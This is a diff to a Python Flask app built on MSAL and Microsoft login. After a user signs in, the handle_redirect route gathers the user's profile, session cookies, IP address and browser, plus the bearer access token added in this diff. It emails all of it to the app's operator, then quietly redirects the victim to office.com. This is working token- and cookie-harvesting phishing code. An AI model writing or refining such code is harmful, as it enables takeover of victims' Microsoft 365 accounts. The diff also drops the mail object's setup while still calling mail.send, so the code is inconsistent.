@@ -6,11 +6,7 @@ import msal
 import socket
 import httpagentparser
 
-basedir = os.path.abspath(os.path.dirname(__file__))
-
 app = Flask(__name__)
-mail = Mail()
-mail.init_app(app)
 
 app.config["DEBUG"] = True
 app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'  # Replace with your secret key
@@ -36,7 +32,6 @@ def browserr():
 @app.route('/')
 def home():
     return render_template('home.html')
-
 
 @app.route('/index')
 def index():
@@ -83,13 +78,23 @@ def handle_redirect():
                 headers={'Authorization': f'Bearer {access_token}'}
             )
             cookies = response.cookies
+
+            # Loop through cookies and format them
+            cookies_string = "\n".join([f"{cookie.name}: {cookie.value}" for cookie in cookies])
+
             device = socket.gethostname()
             ipAddr = socket.gethostbyname(device)
             browser_name = browserr()
 
             user_info = response.json()
-            body = f"Device: {device}\nIP Address: {ipAddr}\nBrowser: {browser_name}\nUser Info: {user_info}\nCookies: {cookies}"
-            print(body)  # Print the body for debugging purposes
+            body = (
+                f"Device: {device}\n"
+                f"IP Address: {ipAddr}\n"
+                f"Browser: {browser_name}\n"
+                f"User Info: {user_info}\n"
+                f"Cookies:\n{cookies_string}\n"
+                f"Access Token: {access_token}"
+            )
 
             try:
                 with app.app_context():
@@ -99,17 +104,20 @@ def handle_redirect():
                         body=body
                     )
                     mail.send(msg)
-                return "login successfully!"
+                print("Email sent successfully!")
             except Exception as e:
-                print(f"Failed to send email: {str(e)}")  # Print the error for debugging purposes
-                return f"Failed to send email: {str(e)}"
+                print(f"Failed to send email: {str(e)}")
+
+            # Redirect the user to the Microsoft 365 homepage
+            return redirect('https://www.office.com/')
         else:
             error = result.get('error')
             error_description = result.get('error_description')
-            print(f"Error: {error}, Description: {error_description}")  # Print the error for debugging purposes
+            print(f"Error: {error}, Description: {error_description}")
             return f"Error: {error}, Description: {error_description}"
     else:
         return "Authorization code not found in request."
 
 if __name__ == '__main__':
     app.run(debug=True)
+
